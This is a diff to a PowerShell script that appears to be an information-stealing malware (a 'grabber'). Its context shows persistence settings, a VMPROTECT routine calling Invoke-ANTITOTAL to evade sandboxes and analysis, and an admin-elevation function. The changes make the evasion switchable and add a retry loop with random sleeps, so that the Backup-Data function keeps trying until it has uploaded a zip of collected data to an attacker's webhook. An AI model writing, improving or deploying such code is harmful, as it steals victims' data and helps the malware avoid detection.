@@ -7,6 +7,8 @@
 #$persistence = $false
 #$write_disk_only = $false
 
+$vm_protect = $true
+
 if ($debug) {
     $ProgressPreference = 'Continue'
 }
@@ -325,7 +327,10 @@ function VMPROTECT {
         Invoke-ANTITOTAL
     }
 }
-VMPROTECT
+
+if ($vm_protect) {
+    VMPROTECT
+}
 
 
 function Request-Admin {
@@ -1129,17 +1134,26 @@ function Backup-Data {
     if ( -not ($write_disk_only)) {    
         $httpClient = [Net.Http.HttpClient]::new()
         $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-    
+        
         $fileStream = [IO.File]::OpenRead($zipFilePath)
         $fileContent = [Net.Http.StreamContent]::new($fileStream)
         $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
         $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
-    
-        $response = $httpClient.PostAsync($webhook, $multipartContent).Result
-        $responseContent = $response.Content.ReadAsStringAsync().Result
-    
-        Write-Output $responseContent
-    
+        
+        $went_through = $false
+        while (-not $went_through) {
+            try {
+                $response = $httpClient.PostAsync($webhook, $multipartContent).Result
+                $responseContent = $response.Content.ReadAsStringAsync().Result
+                Write-Host $responseContent
+                $went_through = $true
+            }
+            catch {
+                $sleepTime = Get-Random -Minimum 10 -Maximum 30
+                Start-Sleep -Seconds $sleepTime
+            }
+        }
+        
         $fileStream.Dispose()
         $httpClient.Dispose()
         $multipartContent.Dispose()
